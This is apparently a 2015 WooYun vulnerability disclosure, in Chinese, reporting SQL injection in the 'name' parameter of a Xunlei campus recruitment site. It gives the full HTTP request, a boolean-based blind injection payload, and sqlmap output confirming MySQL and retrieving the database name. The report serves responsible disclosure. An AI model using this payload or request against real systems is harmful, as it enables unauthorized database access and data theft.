wybug_detail:
漏洞详情 披露状态：   									2015-02-10：	细节已通知厂商并且等待厂商处理中									2015-02-10：	厂商已经确认，细节仅向厂商公开									2015-02-20：	细节向核心白帽子及相关领域专家公开									2015-03-02：	细节向普通白帽子公开									2015-03-12：	细节向实习白帽子公开									2015-03-27：	细节向公众公开  简要描述： 迅雷某站存在SQL注入 详细说明：  问题处：http://campus.xunlei.com/p/test_list.html?city=12#&cityname=%E8%A5%BF%E5%AE%89

参数name存在注入
GET /viewlist?callback=jQuery110206976781970688692_1423556553924&city=12&from=0&to=50&name=&_=1423556553942 HTTP/1.1Host: svr.campus.xunlei.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://campus.xunlei.com/p/test_list.html?city=12&cityname=%E8%A5%BF%E5%AE%89Cookie: cPrePage=playerX-Forwarded-For: Connection: keep-alive
   漏洞证明：  
Place: GETParameter: name    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: callback=jQuery110206976781970688692_1423556553924&city=12&from=0&to=50&name=%' AND 9011=9011 AND '%'='&_=1423556553942[16:57:24] [INFO] testing MySQL[16:57:25] [INFO] confirming MySQL[16:57:25] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL < 5.0.0[16:57:25] [WARNING] information_schema not available, back-end DBMS is MySQL <5. database names will be fetched from 'mysql' database[16:57:25] [INFO] fetching number of databases[16:57:25] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[16:57:25] [INFO] retrieved:[16:57:26] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[16:57:26] [ERROR] unable to retrieve the number of databases[16:57:26] [INFO] falling back to current database[16:57:26] [INFO] fetching current database[16:57:26] [INFO] retrieved: xloasysavailable databases [1]:[*] xloasys
